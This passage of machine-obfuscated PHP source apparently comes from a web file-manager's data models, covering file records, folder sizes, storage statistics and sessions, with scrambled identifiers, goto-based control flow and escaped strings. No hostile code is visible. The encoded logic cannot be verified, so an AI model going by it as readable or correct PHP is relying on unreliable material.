!1; } goto eʤ; eʤ: $E㐲Ӻ = $BǄм[1877]; $Eō = array($BǄм[1739] => $B̈[$BǄм[1740]]); $dؐŸ = $BǄм[64]($BǄм[1436])->{$_SERVER[拘][1164]}($E㐲Ӻ)->{$_SERVER[拘][501]}($Eō)->{$_SERVER[拘][502]}(); goto F膔; F膔: if ($dؐŸ) { $dؐŸ[$BǄм[375]] = $B̈[$BǄм[375]]; } return $dؐŸ; goto e޻; e޻: } private function folderChildrenNumber($FƍŖ) { $A։ =& $_SERVER[拘]; $bÅ = $this->{$_SERVER[拘][491]}($FƍŖ); $a = array($A։[1754] => array($A։[1756], $bÅ[$A։[747]] . $FƍŖ . $A։[1757]), $A։[1796] => 0, $A։[1791] => 1); $dÄ͌ = $this->{$_SERVER[拘][501]}($a)->{$_SERVER[拘][1152]}(); $b덜 = $this->{$_SERVER[拘][501]}($a)->{$_SERVER[拘][501]}(array($A։[1791] => 0))->{$_SERVER[拘][1152]}(); return array($A։[630] => $b덜, $A։[631] => $dÄ͌); } public static $cachePathInfo = array(); public function pathInfo($aĺ֯, $c = false) { goto bΕч; d򔏙: return $d䐢; goto fև; bΕч: $Cݔ = $_SERVER[拘][1404](self::$cachePathInfoMore, $aĺ֯); if ($Cݔ) { return $Cݔ; } $d䐢 = $this->{$_SERVER[拘][491]}($aĺ֯); goto Cǉ; Cǉ: if (!$d䐢) { return !1; } $d䐢 = $this->{$_SERVER[拘][1878]}($d䐢, $c); self::$cachePathInfo[$aĺ֯] = $d䐢; goto d򔏙; fև: } public static $cachePathInfoMore = array(); public function pathInfoMore($A) { goto FӴ; D׵: $a˼ = $this->{$_SERVER[拘][495]}($A); if (!$a˼) { return !1; } if ($a˼[$cʟ[503]] == $cʟ[162]) { $a˼[$cʟ[629]] = $this->{$_SERVER[拘][1879]}($A); } else { $a˼[$cʟ[702]] = $this->{$_SERVER[拘][510]}($A); unset($a˼[$cʟ[702]][$cʟ[40]]); } goto c; FӴ: $cʟ =& $_SERVER[拘]; $D݇ͥ = $cʟ[1404](self::$cachePathInfoMore, $A); if ($D݇ͥ) { return $D݇ͥ; } goto D׵; c: self::$cachePathInfoMore[$A] = $a˼; return $a˼; goto C; C: } public function sourceInfo($bϏƘ) { $D =& $_SERVER[拘]; $c͎ = $D[1880] . $bϏƘ; $eˊʖ = $D[1404](self::$cacheSourceInfo, $c͎); if ($eˊʖ) { return $eˊʖ; } self::$cacheSourceInfo[$c͎] = $this->{$_SERVER[拘][501]}(array($D[499] => $bϏƘ))->{$_SERVER[拘][502]}(); return self::$cacheSourceInfo[$c͎]; } public function sourceCacheClear($Dق = false) { if ($Dق == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[拘][1880] . $Dق]); } public function pathInfoByPath($cղ, $cɽު) { $e󷓘 =& $_SERVER[拘]; $A⭇ = !$cɽު ? array() : $e󷓘[4]($e󷓘[44], $e󷓘[70]($cɽު, $e󷓘[44])); $bۜ = $cղ; foreach ($A⭇ as $cߘ) { $cח = array($e󷓘[483] => $bۜ, $e󷓘[375] => $cߘ); $A삋郐 = $this->{$_SERVER[拘][501]}($cח)->{$_SERVER[拘][502]}(); if (!$A삋郐) { return !1; } $bۜ = $A삋郐[$e󷓘[499]]; } return $this->{$_SERVER[拘][495]}($bۜ, !0); } protected function updateModifyTime($d隸) { $cȾ =& $_SERVER[拘]; if (!$cȾ[93]($d隸)) { $d隸 = array($d隸); } foreach ($d隸 as $d => $eɉ) { $d隸[$d] = $cȾ[455]($eɉ); } $dӴŞ = array($cȾ[499] => array($cȾ[359], $d隸)); $BƧ = array($cȾ[1795] => USER_ID, $cȾ[1636] => $cȾ[50]()); $this->{$_SERVER[拘][501]}($dӴŞ)->{$_SERVER[拘][1062]}($BƧ); } public function folderSizeReset($f) { goto A㌑ͨ; Cΰ: $a = array($C[500] => $f, $C[1796] => 0); $Fߕ = $this->{$_SERVER[拘][501]}($a)->{$_SERVER[拘][1882]}($C[490]); $Fߕ = $C[455]($Fߕ); goto D; d㳽: CacheLock::unlock($aΘ); goto bɘ; D: $FÆф = $Fߕ - $C[455]($b[$C[490]]); if ($FÆф == 0) { return CacheLock::unlock($aΘ); } $this->{$_SERVER[拘][501]}(array($C[1470] => $f))->{$_SERVER[拘][1063]}($C[490], $Fߕ); goto E; A㌑ͨ: $C =& $_SERVER[拘]; if ($this->statusIgnoreResetSpace) { return; } $aΘ = $C[1881] . $f; goto dޫ; E: $b擘 = $this->{$_SERVER[拘][1789]}($b[$C[747]]); if ($b擘) { $a = array($C[499] => array($C[1471], $b擘)); $this->{$_SERVER[拘][501]}($a)->{$_SERVER[拘][1620]}($C[490], $FÆф); } $this->{$_SERVER[拘][1758]}($b[$C[1686]], $b[$C[1661]]); goto d㳽; dޫ: CacheLock::lock($aΘ, 20); $this->{$_SERVER[拘][1808]}($f); $b = $this->{$_SERVER[拘][491]}($f); goto Cΰ; bɘ: } public function folderSizeResetChildren($Eǟ) { goto f茕; fۏم: $F֠آ[$EЄޖ[503]] = 0; $cϯ = $this->{$_SERVER[拘][1164]}($e̝)->{$_SERVER[拘][501]}($F֠آ)->{$_SERVER[拘][1042]}(); if (!$cϯ) { return; } goto Fö; f茕: $EЄޖ =& $_SERVER[拘]; $this->{$_SERVER[拘][1808]}($Eǟ); $C뻄 = $this->{$_SERVER[拘][491]}($Eǟ); goto d򇱗; b馿: foreach ($Cۅ as $b܍) { if ($b܍[$EЄޖ[490]] == $b܍[$EЄޖ[1884]]) { continue; } $A쏰[] = array($EЄޖ[499], $b܍[$EЄޖ[499]], $EЄޖ[490], $b܍[$EЄޖ[490]]); } $this->{$_SERVER[拘][1774]}($A쏰); goto Aͽ; Fö: $Cۅ[] = $C뻄; $Cۅ = $EЄޖ[413]($Cۅ, $EЄޖ[499]); foreach ($Cۅ as $Dǫ׃ => $b܍) { $Cۅ[$Dǫ׃][$EЄޖ[1884]] = $Cۅ[$Dǫ׃][$EЄޖ[490]]; $Cۅ[$Dǫ׃][$EЄޖ[490]] = 0; } goto b; d򇱗: $F֠آ = array($EЄޖ[1791] => 1, $EЄޖ[1754] => array($EЄޖ[1756], $C뻄[$EЄޖ[747]] . $Eǟ . $EЄޖ[1757])); $e̝ = $EЄޖ[1883]; $Cۅ = $this->{$_SERVER[拘][1164]}($e̝)->{$_SERVER[拘][501]}($F֠آ)->{$_SERVER[拘][1042]}(); goto fۏم; b: foreach ($cϯ as $b܍) { $c = $b܍[$EЄޖ[483]] . $EЄޖ[67]; if (!isset($Cۅ[$c])) { continue; } if ($b܍[$EЄޖ[1753]] == $Cۅ[$c][$EЄޖ[1753]]) { $Cۅ[$c][$EЄޖ[490]] += $b܍[$EЄޖ[490]]; } } foreach ($Cۅ as $b܍) { $f = $this->{$_SERVER[拘][1789]}($b܍[$EЄޖ[747]]); foreach ($f as $c) { $c = $c . $EЄޖ[67]; if (!isset($Cۅ[$c])) { continue; } if ($b܍[$EЄޖ[1753]] == $Cۅ[$c][$EЄޖ[1753]]) { $Cۅ[$c][$EЄޖ[490]] += $b܍[$EЄޖ[490]]; } } } $A쏰 = array(); goto b馿; Aͽ: } public function targetSpaceUpdate($Bʦԗ, $fҨ) { $E∭ =& $_SERVER[拘]; if (!$E∭[176]($Bʦԗ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Dڪ = $this->{$_SERVER[拘][1885]}($Bʦԗ, $fҨ); if ($Bʦԗ == self::TYPE_USER) { $E∭[64]($E∭[1839])->{$_SERVER[拘][1886]}($fҨ, array($E∭[1431] => $Dڪ)); } else { if ($Bʦԗ == self::TYPE_GROUP) { $E∭[64]($E∭[1841])->{$_SERVER[拘][1887]}($fҨ, array($E∭[1431] => $Dڪ)); } } } public function targetSpaceSize($B۠, $eʿ) { goto c; a: $B = $fޓ[1052]($cӅ[$fޓ[490]]); $bΐױ = array($fޓ[1754] => array($fޓ[1756], $fޓ[1856] . $cӅ[$fޓ[499]] . $fޓ[1888])); $b݂ = $fޓ[64]($fޓ[1889])->{$_SERVER[拘][1164]}($fޓ[1470])->{$_SERVER[拘][501]}($bΐױ)->{$_SERVER[拘][1042]}(); goto Eό; Eό: $b݂ = $fޓ[413]($b݂, $fޓ[67], $fޓ[499]); if ($b݂) { $bΐױ = array($fޓ[1470] => array($fޓ[1471], $b݂)); $B += $fޓ[1052]($this->{$_SERVER[拘][501]}($bΐױ)->{$_SERVER[拘][1882]}($fޓ[490])); } return $B; goto C; c: $fޓ =& $_SERVER[拘]; $cӅ = $this->{$_SERVER[拘][1855]}($B۠, $eʿ, !0); if (!$cӅ) { return 0; } goto a; C: } public function allFileTypeProfile() { return $this->{$_SERVER[拘][1890]}(!1, !1); } public function userFileTypeProfile($eŗ) { return $this->{$_SERVER[拘][1890]}($eŗ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Bݝ҃) { return $this->{$_SERVER[拘][1890]}($Bݝ҃, SourceModel::TYPE_GROUP); } private function fileTypeProfile($AØ, $Cܛ) { goto e; Dȏ͌: $D© = array(); $D©[$dÚم[1891]] = array($dÚم[1892] => $dÚم[387]($dÚم[1891]), $dÚم[1893] => $this->{$_SERVER[拘][501]}($A)->{$_SERVER[拘][1152]}(), $dÚم[1730] => $this->{$_SERVER[拘][501]}($A)->{$_SERVER[拘][1882]}($dÚم[490])); $fŶ = KodIO::fileTypeList(); goto cن; cن: foreach ($fŶ as $bњ => $dĴ) { $A[$dÚم[1793]] = $this->{$_SERVER[拘][1894]}($bњ); $D©[$bњ] = array($dÚم[1892] => $dĴ[$dÚم[375]], $dÚم[1893] => $this->{$_SERVER[拘][501]}($A)->{$_SERVER[拘][1152]}(), $dÚم[1730] => $this->{$_SERVER[拘][501]}($A)->{$_SERVER[拘][1882]}($dÚم[490])); } return $D©; goto Fφ; e: $dÚم =& $_SERVER[拘]; $A = array($dÚم[1791] => 0); if ($AØ != !1) { $A[$dÚم[1661]] = $AØ; $A[$dÚم[1686]] = $Cܛ; } goto Dȏ͌; Fφ: } public function fileNameExist($E䫇, $d廣) { $eԹ҂ =& $_SERVER[拘]; $Eʰ = $this->{$_SERVER[拘][1895]}($E䫇); foreach ($Eʰ as $b) { if ($eԹ҂[80]($b[$eԹ҂[375]]) == $eԹ҂[80]($d廣)) { return $b[$eԹ҂[499]]; } } return !1; } public function childList($Eƃ) { $cЇީ٘ =& $_SERVER[拘]; $cֺ墤 = array($cЇީ٘[483] => $cЇީ٘[455]($Eƃ), $cЇީ٘[1753] => 0); $bڼ = $this->{$_SERVER[拘][1896]}()->{$_SERVER[拘][501]}($cֺ墤)->{$_SERVER[拘][1042]}(); $bڼ = $bڼ ? $bڼ : array(); foreach ($bڼ as $E޳) { $d = $cЇީ٘[1880] . $E޳[$cЇީ٘[499]]; self::$cacheSourceInfo[$d] = $E޳; } return $bڼ; } public function fileNameAuto($a, $dŝČ, $bݎ = REPEAT_RENAME, $c뉸 = false) { $b =& $_SERVER[拘]; $Cǲ = $this->{$_SERVER[拘][1895]}($a); $f = $b[413]($Cǲ, $b[67], $b[375]); return $this->{$_SERVER[拘][1804]}($f, $dŝČ, $bݎ, $c뉸); } public function fileNameAutoGet($Eח, $bև, $F, $dȭ) { $F =& $_SERVER[拘]; if ($F == REPEAT_REPLACE || !$Eח || !$F[1897]($bև, $Eח) || $dȭ && $F != REPEAT_RENAME_FOLDER) { return $bև; } if ($F == REPEAT_SKIP) { return !1; } $DЇ = $F[348] . $F[708]($bև); $DЇ = $DЇ == $F[348] || $dȭ ? $F[67] : $DЇ; for ($aꋠ = 1; $aꋠ <= $F[37]($Eח) + 1; $aꋠ++) { $e읤 = $F[7]($bև, 0, $F[195]($bև) - $F[195]($DЇ)); $D䨇 = $e읤 . "\50{$aꋠ}\51{$DЇ}"; if (!$F[1897]($D䨇, $Eח)) { return $D䨇; } } } } class AnalysisModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\162\x65\x67\151\163\164\x52\x65\143\x6f\162\144\x4c\151\163\x74"; public $field = array("\144\x61\x74\x65", "\x63\x6e\x74"); public function init($e֠) { $A =& $_SERVER[拘]; $Cӻڭ = array($A[127] => array($A[400] => $A[1898], $A[280] => array($A[791], $A[1899])), $A[1900] => array($A[400] => $A[1901], $A[280] => array($A[791], $A[490], $A[1902]))); $this->optionType = $Cӻڭ[$e֠][$A[400]]; $this->field = $Cӻڭ[$e֠][$A[280]]; } public function listData($fѓނ = false, $a߃ = "\155\x6f\144\151\x66\171\124\151\155\x65", $Eﱞ = false) { return parent::listData($fѓނ, $a߃, $Eﱞ); } public function recordTest() { $dϒ =& $_SERVER[拘]; $D뭆 = 0; for ($BČ = 100; $BČ >= 0; $BČ--) { $aÅ = $dϒ[908]($dϒ[1903], $dϒ[671]("\x2d\40{$BČ}\x20\x64\141\171\x73")); $E걭 = $dϒ[413]($this->{$_SERVER[拘][504]}(), $dϒ[791]); if (isset($E걭[$aÅ])) { continue; } $d += $dϒ[122](0, 200); $eܨÑ += $dϒ[122](0, 100); $e = array($dϒ[791] => $aÅ, $dϒ[490] => $d, $dϒ[1902] => $eܨÑ); parent::insert($e); } return !0; } public function record($A) { goto fۅ; fۅ: $aޢ =& $_SERVER[拘]; $this->{$_SERVER[拘][28]}($A); $C∟ = $aޢ[908]($aޢ[1903], $aޢ[671]($aޢ[1904])); goto B癡Ԃ; B癡Ԃ: $F = $aޢ[413]($this->{$_SERVER[拘][504]}(), $aޢ[791]); if (isset($F[$C∟])) { return !0; } $C垖 = array($aޢ[791] => $C∟); goto B՝; B՝: if ($A == $aޢ[127]) { $A = $aޢ[64]($aޢ[1513])->{$_SERVER[拘][501]}(array($aޢ[928] => 1))->{$_SERVER[拘][1152]}($aޢ[1905]); $C垖[$aޢ[1899]] = $A; } else { $c = $this->{$_SERVER[拘][1906]}(); $C垖 = $aޢ[153]($C垖, $c); } return parent::insert($C垖); goto C; C: } private function sourceSize() { $Cʇښ =& $_SERVER[拘]; $bа݊ = $Cʇښ[64]($Cʇښ[474])->{$_SERVER[拘][501]}(array($Cʇښ[483] => 0))->{$_SERVER[拘][1882]}($Cʇښ[490]); $E쎋ӹ = $Cʇښ[64]($Cʇښ[1436])->{$_SERVER[拘][1882]}($Cʇښ[490]); return array($Cʇښ[490] => $bа݊, $Cʇښ[1902] => $E쎋ӹ); } private function trendInit($aԑ, $AמҴ) { $Fυ =& $_SERVER[拘]; $Aʄ˂ = $a̝ = array($Fυ[791] => $Fυ[908]($Fυ[1907]), $Fυ[1386] => $AמҴ[0], $aԑ => 0); $a̝[$Fυ[1386]] = $AמҴ[1]; return array($Aʄ˂, $a̝); } public function trend($a, $DΫ) { goto Dϋ; C椠: return $EⰑ; goto E핬ޱ; dߪ: if (empty($Aǐ)) { return $this->{$_SERVER[拘][1911]}($fף[1899], array($A, $C)); } $fף[1912]($Aǐ); $Dݞ = $this->{$_SERVER[拘][1913]}(); goto aΕ; Dϋ: $fף =& $_SERVER[拘]; $this->{$_SERVER[拘][28]}($a); if ($a == $fף[1900]) { return $this->{$_SERVER[拘][1908]}($DΫ); } goto a; a: $A = $fף[387]($fף[1909]); $C = $fף[387]($fף[1910]); $Aǐ = $fף[413]($this->{$_SERVER[拘][504]}(), $fף[791], $fף[1899]); goto dߪ; aΕ: if ($DΫ != $fף[1914]) { goto A٘Ն; A٘Ն: $aۇ = $fף[766]($fף[524]($Aǐ, 0, 1)); $aɫ = $aۇ[0]; $B艉ӎ = $this->{$_SERVER[拘][1915]}($DΫ, $aɫ); goto eۂ; eۂ: $d = array(); foreach ($B艉ӎ as $F) { $d[$F] = isset($Aǐ[$F]) ? $Aǐ[$F] : 0; } $Aǐ = $d; goto c; c: $fף[1912]($Aǐ); goto a; a: } $EⰑ = array(); foreach ($Aǐ as $F => $c) { $EⰑ[] = array($fף[791] => $F, $fף[1386] => $A, $fף[1899] => $c); $EⰑ[] = array($fף[791] => $F, $fף[1386] => $C, $fף[1899] => isset($Dݞ[$F]) ? (int) $Dݞ[$F][$fף[1899]] : 0); } goto C椠; E핬ޱ: } public function storeTrend($FڻҨ) { goto cȭψ; E򶘑: $Cפ = $f튧[413]($this->{$_SERVER[拘][504]}(), $f튧[791]); if (empty($Cפ)) { return $this->{$_SERVER[拘][1911]}($f튧[490], array($fϛ, $e)); } $f튧[1912]($Cפ); goto fӭ; cȭψ: $f튧 =& $_SERVER[拘]; $fϛ = $f튧[387]($f튧[1916]); $e = $f튧[387]($f튧[1917]); goto E򶘑; fϟ: return $dߦӟ; goto Fս; fӭ: if ($FڻҨ != $f튧[1914]) { goto cŜ; E埠: $f튧[922]($a); $aȩ = array(); foreach ($a as $cÞ) { $aȩ[$cÞ] = isset($Cפ[$cÞ]) ? $Cפ[$cÞ] : array(); } goto dۃۊ; dۃۊ: $Cפ = $aȩ; goto fҡ; cŜ: $fã堒 = $f튧[766]($f튧[524]($Cפ, 0, 1)); $aŸ = $fã堒[0]; $a = $this->{$_SERVER[拘][1915]}($FڻҨ, $aŸ); goto E埠; fҡ: } $dߦӟ = array(); foreach ($Cפ as $cÞ => $Aҙ) { $dߦӟ[] = array($f튧[791] => $cÞ, $f튧[1386] => $fϛ, $f튧[490] => isset($Aҙ[$f튧[490]]) ? (double) $this->{$_SERVER[拘][1918]}($Aҙ[$f튧[490]]) : 0); $dߦӟ[] = array($f튧[791] => $cÞ, $f튧[1386] => $e, $f튧[490] => isset($Aҙ[$f튧[490]]) ? (double) $this->{$_SERVER[拘][1918]}($Aҙ[$f튧[1902]]) : 0); } goto fϟ; Fս: } private function getGb($a화ͬ) { $dԌհ = 1073741824; $Dƿ = 2; return $_SERVER[拘][1919]($a화ͬ / $dԌհ, $Dƿ); } public function loginTrend() { $E =& $_SERVER[拘]; $C = $E[1920]; $c = $E[64]($E[1921])->{$_SERVER[拘][260]}($C); return $E[413]($c, $E[791]); } public function validDate($E޶ř, $B) { $bι߾ =& $_SERVER[拘]; $E = $bι߾[908]($bι߾[1922]); $c = array($E); switch ($E޶ř) { case $bι߾[1923]: $A = $bι߾[1924](0, 0, 0, $bι߾[908]($bι߾[1925]), $bι߾[908]($bι߾[1926]) - $bι߾[908]($bι߾[574]) + 7 - 7, $bι߾[908]($bι߾[1927])); $cǼߛ = 0; do { $d = $bι߾[908]($bι߾[1922], $A - 3600 * 24 * 7 * $cǼߛ); $c[] = $d; $cǼߛ++; } while ($B < $d); break; case $bι߾[1928]: $cǼߛ = 0; do { $A֑ = $bι߾[908]($bι߾[1929], $bι߾[671]("\55\x20{$cǼߛ}\40\x6d\157\156\x74\150\x73")); $c[] = $A֑; $cǼߛ++; } while ($B < $A֑); break; case $bι߾[1930]: $fǾ = (int) $bι߾[908]($bι߾[1927], $bι߾[671]($B)); $bϔ蚅 = (int) $bι߾[908]($bι߾[1927]); if ($fǾ >= $bϔ蚅) { break; } for ($fǾ; $fǾ < $bϔ蚅; $fǾ++) { $c[] = $fǾ . $bι߾[1931]; } break; default: break; } if ($E޶ř != $bι߾[1930] && $B > $bι߾[1422]($c)) { $bι߾[1932]($c); } return $c; } public function listTable($fҳ) { goto AŎ; eӜ: if (empty($a؍[$a۫ϖ[1155]])) { return $a؍; } $eۏ = $a۫ϖ[64]($a۫ϖ[1933])->{$_SERVER[拘][1934]}($a۫ϖ[1660])->{$_SERVER[拘][1164]}($a۫ϖ[1935])->{$_SERVER[拘][1042]}(); $Cڴ = $a۫ϖ[413]($eۏ, $a۫ϖ[1660], $a۫ϖ[375]); goto fą; AŎ: $a۫ϖ =& $_SERVER[拘]; if ($fҳ == $a۫ϖ[127]) { return $a۫ϖ[64]($a۫ϖ[1513])->{$_SERVER[拘][504]}(); } $a؍ = $a۫ϖ[64]($a۫ϖ[1933])->{$_SERVER[拘][504]}(); goto eӜ; fą: foreach ($a؍[$a۫ϖ[1155]] as $f¼ => $A܊) { $B̴ = $a۫ϖ[4]($a۫ϖ[119], $a۫ϖ[70]($A܊[$a۫ϖ[747]], $a۫ϖ[119])); $eܠ΄ = $a۫ϖ[159](function ($cߌ) use($Cڴ) { return $Cڴ[$cߌ]; }, $B̴); $aƙ = $a۫ϖ[152]($a۫ϖ[44], $eܠ΄); $a؍[$a۫ϖ[1155]][$f¼][$a۫ϖ[40]] = empty($aƙ) ? $aƙ : $aƙ . $a۫ϖ[44] . $A܊[$a۫ϖ[375]]; if ($a؍[$a۫ϖ[1155]][$f¼][$a۫ϖ[1936]] != 0) { $a؍[$a۫ϖ[1155]][$f¼][$a۫ϖ[1936]] *= 1024 * 1024 * 1024; } } return $a؍; goto eɇ; eɇ: } public function userSizeList() { $AϜ =& $_SERVER[拘]; $c = array($AϜ[1686] => 1, $AϜ[483] => 0); $E = $this->{$_SERVER[拘][1608]}()->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1508]}(); if (empty($E[$AϜ[1155]])) { return $E; } } public function groupSizeList() { goto ḃ; ḃ: $CڏƊ =& $_SERVER[拘]; $c = array($CڏƊ[1686] => 2); $E = $this->{$_SERVER[拘][1608]}()->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1508]}(); goto C↥; C↥: if (empty($E[$CڏƊ[1155]])) { return $E; } $Cߞ = $CڏƊ[64]($CڏƊ[1933])->{$_SERVER[拘][1934]}($CڏƊ[1660])->{$_SERVER[拘][1164]}($CڏƊ[1935])->{$_SERVER[拘][1042]}(); $F = $CڏƊ[413]($Cߞ, $CڏƊ[1660], $CڏƊ[375]); goto cϲ; cϲ: foreach ($E[$CڏƊ[1155]] as $cьՇ => $F) { $e = $CڏƊ[4]($CڏƊ[119], $CڏƊ[70]($F[$CڏƊ[747]], $CڏƊ[119])); $eޅ = $CڏƊ[159](function ($eɆ) use($F) { return $F[$eɆ]; }, $e); $E[$CڏƊ[1155]][$cьՇ][$CڏƊ[1937]] = $CڏƊ[152]($CڏƊ[44], $eޅ); } return $E; goto E; E: } private function groupNameList() { $c =& $_SERVER[拘]; $E = $c[64]($c[1933])->{$_SERVER[拘][1934]}($c[1660])->{$_SERVER[拘][1164]}($c[1935])->{$_SERVER[拘][1042]}(); $F = $c[413]($E, $c[1660], $c[375]); return $F; } private function _makeOrder($d = '') { goto C; C: $aǴ =& $_SERVER[拘]; $a㽉 = array($aǴ[490], $aǴ[558]); $F񡆪 = array($aǴ[1601] => $aǴ[1602], $aǴ[1603] => $aǴ[1511]); goto f̞; f̞: $a􌽌 = Input::get($aǴ[1635], $aǴ[359], $aǴ[1938], $a㽉); $d귚 = Input::get($aǴ[1604], $aǴ[359], $aǴ[1605], array($aǴ[1605], $aǴ[1603])); $d귚 = $F񡆪[$d귚]; goto B; B: $d = $d . "\151\157\137\163\x6f\165\162\143\145\x2e{$a􌽌}\x20{$d귚}\x2c\x20\x69\157\137\163\157\165\162\143\x65\x2e\143\x72\x65\141\164\145\124\151\x6d\x65\x20\x61\x73\x63"; return $aǴ[64]($aǴ[474])->{$_SERVER[拘][1450]}($d); goto f닆; f닆: } public function summary() { goto AҨ; a: $dȴ = $dĘ[1944]; $E = $dĘ[64]($dĘ[474])->{$_SERVER[拘][260]}($dȴ); $dƯ = (int) $E[0][$dĘ[557]]; goto D; cՊ: $Eл = $dĘ[67]; $c = array($dĘ[559] => array($dĘ[197], $dĘ[50]() - 3600 * 2)); $Eƹ웊 = $dĘ[64]($dĘ[1939])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1152]}($dĘ[1905]); goto e衝; AҨ: $dĘ =& $_SERVER[拘]; $bᛌ = $dĘ[64]($dĘ[1513])->{$_SERVER[拘][501]}(array($dĘ[928] => 1))->{$_SERVER[拘][1152]}(); $A = $dĘ[67]; goto cՊ; e衝: $c[$dĘ[559]] = array($dĘ[201], $dĘ[671]($dĘ[908]($dĘ[1940]))); $c = $dĘ[64]($dĘ[1939])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1152]}($dĘ[1905]); $fڷ = $this->{$_SERVER[拘][1906]}(); goto a; D: $c[$dĘ[1686]] = 2; $C = $fϕ = $dĘ[64]($dĘ[474])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1882]}($dĘ[490]); $dȴ = $dĘ[1943]; goto C扅; Eُ: $BǏ = (int) $E[0][$dĘ[1942]] - $D; $c = array($dĘ[483] => 0, $dĘ[1686] => 1); $D = $fϕ = $dĘ[64]($dĘ[474])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1882]}($dĘ[490]); goto D; a: $dȴ = $dĘ[1941]; $E = $dĘ[64]($dĘ[474])->{$_SERVER[拘][260]}($dȴ); $D = (int) $E[0][$dĘ[557]]; goto Eُ; D: $a = (int) $E[0][$dĘ[1942]] - $dƯ; return array($dĘ[1945] => (int) $bᛌ, $dĘ[1385] => $dĘ[387]($dĘ[1946]) . $dĘ[88], $dĘ[1947] => (int) $bᛌ, $dĘ[1948] => (int) $Eƹ웊, $dĘ[1949] => (int) $c, $dĘ[490] => (double) $fڷ[$dĘ[490]], $dĘ[1902] => (double) $fڷ[$dĘ[1902]], $dĘ[1950] => $D, $dĘ[1951] => $BǏ, $dĘ[1952] => (double) $D, $dĘ[1953] => (double) $C, $dĘ[1954] => (int) $dӴ, $dĘ[1955] => (int) $d׼, $dĘ[1956] => (int) $dƯ, $dĘ[1957] => (int) $a); goto C; C扅: $E = $dĘ[64]($dĘ[474])->{$_SERVER[拘][260]}($dȴ); $dӴ = (int) $E[0][$dĘ[557]]; $d׼ = (int) $E[0][$dĘ[1942]] - $dӴ; goto a; C: } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\163\145\163\163\151\x6f\156"; public function get($E) { $dק =& $_SERVER[拘]; $E = $this->{$_SERVER[拘][501]}(array($dק[1958] => $E))->{$_SERVER[拘][502]}(); if (!$dק[93]($E)) { return !1; } return $E[$dק[1959]]; } public function set($E, $F, $Bɷ = 3600) { $c =& $_SERVER[拘]; $BːП = array($c[1958] => $E, $c[1489] => $F, $c[1960] => $Bɷ + $c[50]()); if (Session::get($c[1961])) { $BːП[$c[1512]] = Session::get($c[1961]); } else { $BːП[$c[1512]] = 0; } if ($this->{$_SERVER[拘][59]}($E)) { return $this->{$_SERVER[拘][501]}(array($c[1958] => $E))->{$_SERVER[拘][1062]}($BːП); } else { return $this->{$_SERVER[拘][63]}($BːП); } } public function remove($E) { return $this->{$_SERVER[拘][501]}(array($_SERVER[拘][1958] => $E))->{$_SERVER[拘][308]}(); } public function clearTimeout() { $dѶ =& $_SERVER[拘]; return $this->{$_SERVER[拘][501]}($dѶ[1962] . $dѶ[50]())->{$_SERVER[拘][308]}(); } } goto c; FϦҢ: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\145"; public function addFileByContent($e = '', $DЉЭ = '') { goto AƬ; A㩃: $aѐ = $C . $fƞ͋[1725] . $fƞ͋[405](16); $fƞ͋[344]($aѐ, $e); $a = $this->{$_SERVER[拘][511]}($aѐ, $DЉЭ, !0); goto cŏ; AƬ: $fƞ͋ =& $_SERVER[拘]; $C = TEMP_PATH . $fƞ͋[1724]; if (!$fƞ͋[586]($C)) { $fƞ͋[403]($C); } goto A㩃; cŏ: if ($fƞ͋[48]($aѐ)) { @$fƞ͋[51]($aѐ); } return $a; goto bƑ; bƑ: } public function createFileName() { goto f̋; f̋: $dҴ =& $_SERVER[拘]; $b膧 = KodIO::defaultIO() . $dҴ[908]($dҴ[1727]); $B͙ = $b膧 . $dҴ[405](5) . $dҴ[1683](100); goto Cǃϛֺ; Cǃϛֺ: static $c = false; $B = $dҴ[1728] . $dҴ[46]($b膧); if (!$c && !Cache::get($B)) { $c = !0; $a = IO::mkdir($b膧); if (!IO::exist($a . $dҴ[1729])) { IO::mkfile($a . $dҴ[1729]); } Cache::set($B, 1, 3600 * 5); } goto E; E: return $B͙; goto A߶; A߶: } public function addFileByRemote($Dؐ, $C, $c = array()) { goto aׯ݄; bݞ: $C = IO::hashMd5($Dؐ, $fڍȿ); $cɠߋ = KodIO::defaultDriver(); $Fݜ = array($FɟԞ[1730] => IO::size($Dؐ), $FɟԞ[1731] => 1, $FɟԞ[1453] => $C, $FɟԞ[1732] => $cɠߋ[$FɟԞ[414]], $FɟԞ[1452] => $Dؐ, $FɟԞ[1733] => $c[$FɟԞ[703]] ? $c[$FɟԞ[703]] : IO::hashSimple($Dؐ), $FɟԞ[1734] => $C ? $C : $fڍȿ); goto cߣ; cߣ: if ($c։ʾ = $this->{$_SERVER[拘][1735]}($Fݜ[$FɟԞ[703]], $Fݜ[$FɟԞ[518]], $Fݜ[$FɟԞ[490]])) { return $c։ʾ; } $e = $this->{$_SERVER[拘][63]}($Fݜ); return $this->{$_SERVER[拘][502]}($e); goto A; aׯ݄: $FɟԞ =& $_SERVER[拘]; if (!IO::exist($Dؐ)) { return !1; } $fڍȿ = $c[$FɟԞ[518]] ? $c[$FɟԞ[518]] : $FɟԞ[67]; goto bݞ; A: } public function addFile($A랝, $b޶, $dާ = false) { goto B; C : if ($C؏ = $this->{$_SERVER[拘][1735]}($dԃ, $e, $dͥ)) { return $C؏; } $bÂ = $this->{$_SERVER[拘][1736]}($A랝, $dͥ, $dԃ, $e, $b޶, $dާ); $C煈 = $this->{$_SERVER[拘][63]}($bÂ); goto E; B: $dԃ = IO::hashSimple($A랝); $e = IO::hashMd5($A랝); $dͥ = IO::size($A랝); goto C ; E: $C؏ = $this->{$_SERVER[拘][502]}($C煈); return $C؏; goto aеȒ; aеȒ: } public function addFileMake($bן, $e, $E, $b½, $fΔ, $fو) { $C𵙖 =& $_SERVER[拘]; $aⅵ = $this->{$_SERVER[拘][515]}(); if ($fو) { IO::move($bן, $aⅵ); } else { IO::copy($bן, $aⅵ); } $f = KodIO::defaultDriver(); $Cǂ = array($C𵙖[1730] => 